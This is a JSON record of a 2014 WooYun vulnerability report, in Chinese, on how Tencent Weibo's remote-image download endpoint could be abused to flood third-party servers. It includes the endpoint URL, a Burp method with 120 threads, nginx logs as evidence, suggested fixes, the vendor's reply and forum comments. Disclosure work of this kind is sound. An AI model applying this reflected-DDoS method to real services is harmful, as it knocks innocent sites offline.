{"id": 3546, "wybug_id": "wooyun-2014-059188", "wybug_title": "腾讯微博可能会被用作于DDOS他人服务器", "wybug_corp": "腾讯", "wybug_author": "imlonghao", "wybug_date": "2014-05-02 17:39", "wybug_open_date": "2014-06-16 17:40", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-16：\t细节向公众公开  简要描述： 通过腾讯微博的某处功能缺陷，可能会允许黑客利用其功能缺陷攻击他人服务器..实测攻击瞬时最高达到400Mbps(可能统计不准确) 详细说明：  腾讯微博分享图片处，允许引用外部链接分享图片。分享外部链接，腾讯的服务器会对其进行远程图片本地化，就是将图片拉回腾讯的服务器\n\n\n\n\nhttp://upload.t.qq.com/old/uploadextpic.php?sourcepic=http%3A%2F%2Fimlonghao.com%2F1.jpg(省略了部分参数)\n而这个地方，我发现并没有做太多的限制.通过用户所提交的地址，服务器先会分析其是否是一张合法的图片，如果是，则会进行下载。这个地方对每个用户今天所能提交的请求没有限制，意味着我们可以无限请求这个攻击这个地方对同一个图片地址无论之前是否曾经下载过，都会进行新一次的下载   漏洞证明：  ==对同一个相同地址多次下载==在一般短的时间内，发起两次请求。发现我们得到了两个不同的图片地址的返回值\n\n\n\n==DDOS test #1==测试的图片地址是：http://imlonghao.com/wp-content/uploads/2013/06/Veil_3.png大小：492.0KiBBurp并发120线程，测试了5000次左右\n\n（未开始）\n\n\n\n==DDOS test #2==测试的图片地址是：http://imlonghao.com/1.jpg大小：15.3MiB同样也是Burp并发120线程，测试了10000次请求\n\n（未开始）\n\n\n\n\n\n可见这次的效果更好，最高达到了50MB/s的出网速度.但是，在测试的过程中也发现，有时候腾讯的下载服务器会把这个图片判定为不是图片，所以有时候的下载就是到一般的时候自动停止。Nginx Log\n183.60.5.144 - - [02/May/2014:17:10:51 +0800] \"GET /1.jpg?pid=9925 HTTP/1.1\" 200 4996874 \"-\" \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36\" \"-\"183.60.5.144 - - [02/May/2014:17:10:51 +0800] \"GET /1.jpg?pid=9919 HTTP/1.1\" 200 10911498 \"-\" \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36\" \"-\"183.60.5.144 - - [02/May/2014:17:10:51 +0800] \"GET /1.jpg?pid=9924 HTTP/1.1\" 200 12369674 \"-\" \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36\" \"-\"183.60.5.144 - - [02/May/2014:17:10:51 +0800] \"GET /1.jpg?pid=9861 HTTP/1.1\" 200 14368522 \"-\" \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36\" \"-\"183.60.5.144 - - [02/May/2014:17:10:51 +0800] \"GET /1.jpg?pid=9918 HTTP/1.1\" 200 14335754 \"-\" \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36\" \"-\"183.60.5.144 - - [02/May/2014:17:10:51 +0800] \"GET /1.jpg?pid=9958 HTTP/1.1\" 200 14401290 \"-\" \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36\" \"-\"183.60.5.144 - - [02/May/2014:17:10:51 +0800] \"GET /1.jpg?pid=9959 HTTP/1.1\" 200 8552202 \"-\" \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36\" \"-\"183.60.5.144 - - [02/May/2014:17:10:51 +0800] \"GET /1.jpg?pid=9863 HTTP/1.1\" 200 6389514 \"-\" \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36\" \"-\"183.60.5.144 - - [02/May/2014:17:10:51 +0800] \"GET /1.jpg?pid=9865 HTTP/1.1\" 200 10223370 \"-\" \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36\" \"-\"\n通过nginx的日志不难看出，许多次请求都进行到一般就自动结束了，并没有请求完整张图片，不过效果也是十分明显的。\n\n这是SolusVM所提供的流量图，但是上面并没有50M/s的记录我认为这是由于他所提供的记录拉了平均，因为这么长时间的速度并没有持续很长时间。==总结==可能使用一个更加优秀的POC可以达到更好的效果，不过就现在这样也可以令许多网站下线了！   修复方案：  尽管Facebook和Google都否认了他们所存在的类似漏洞，但是我觉得腾讯你们也应该有自己的看法。我的修复方案是：限制每个用户一天最多能使用多少次远程下载的功能正常用户一天发几W张图片你觉得他发的是什么？对地址进行记录，已经下载过的不进行另外的下载（不过这点似乎有点扯...可以绕过）你们自己看看把~~   版权声明：转载请注明来源 imlonghao@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-05-04 12:30 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-02 17:45 |    \t\tMoogong \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:8        | 伪法医)\t\t \n  google ddos!    \n     2014-05-02 17:46 |    \t\tE7LE \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 好激动，这该怎么填写。。。)\t\t \n  这都可以D啊。。。。    \n     2014-05-02 18:08 |    \t\tMeirLin \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:30        | 号借人)\t\t \n  默默关注下    \n     2014-05-02 18:11 |    \t\tjusker \t\t\t( 实习白帽子  |\t\t\t        Rank:67 漏洞数:11        | xxoo决定未来)\t\t \n  目测是这个?http://www.freebuf.com/articles/web/33345.html    \n     2014-05-02 18:18 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  @jusker 同理    \n     2014-05-02 19:55 |    \t\tAres \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 来自幼儿园大班)\t\t \n  mark。。是不是和搜狐视频那个一样原理？    \n     2014-05-02 20:18 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  洞主诈尸了...    \n     2014-05-02 20:48 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  @zeracker 你也差不多2013-11-11到2014-04-08    \n     2014-05-09 20:05 |    \t\tz7y \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:9        | 关注技术与网络安全)\t\t \n  洞主诈尸了...    \n     2014-06-20 10:57 |    \t\t逗比 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:6        | 逗比的年代，诶油我艹)\t\t \n  这样都行，感觉工具都是浮云了    \n     2014-06-20 12:59 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  @逗比 工具本来是浮云    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}